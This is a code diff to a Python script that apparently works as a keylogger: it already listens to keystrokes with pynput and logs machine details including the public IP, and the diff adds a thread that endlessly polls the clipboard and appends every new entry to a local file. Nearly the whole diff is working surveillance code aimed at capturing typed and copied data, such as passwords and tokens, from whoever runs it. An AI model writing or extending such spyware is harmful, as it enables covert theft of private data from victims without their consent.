@@ -4,6 +4,7 @@ import threading
 import socket
 import platform
 import requests
+import pyperclip
 from requests import get 
 from pynput.keyboard import Key, Listener
 
@@ -50,10 +51,24 @@ def write_machine_info_file():
 		file.write("Machine version: %s" %platform.version())
 		file.write("\n")
 		file.write("public IP: %s" %get('https://api.ipify.org').text)
-		
+
+def get_clipboard_history():
+	clipboard_history = ""
+	open("clipboard_hist.text", "w")
+	while 1:
+		if pyperclip.paste() == clipboard_history:
+			print("nothing new")
+		else:
+			with open("clipboard_hist.text", "a") as file:
+				file.write(pyperclip.paste())
+				file.write("\n")
+			clipboard_history = pyperclip.paste()
+
 def main():
-	machine_info = threading.Thread(target=write_machine_info_file)
+	machine_info      = threading.Thread(target=write_machine_info_file)
 	machine_info.start()
+	clipboard_history = threading.Thread(target=get_clipboard_history)
+	clipboard_history.start()
 	with Listener(on_press=on_press) as listener:
 		listener.join()
 
